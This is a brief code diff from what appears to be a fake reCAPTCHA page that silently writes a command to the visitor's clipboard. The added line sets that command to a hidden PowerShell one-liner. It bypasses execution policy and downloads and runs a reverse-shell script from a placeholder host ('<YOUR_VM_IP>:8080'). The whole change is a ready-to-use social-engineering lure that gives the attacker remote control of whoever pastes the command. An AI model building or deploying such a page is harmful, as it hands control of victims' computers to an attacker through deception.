@@ -395,7 +395,7 @@
             const suffix = " # "
             const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
             const end = "''"
-            const textToCopy = commandToRun + suffix + ploy + verification_id + end
+            const textToCopy = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_VM_IP>:8080/reverse-shell.ps1')"`;
 
             setClipboardCopyData(textToCopy);
         }
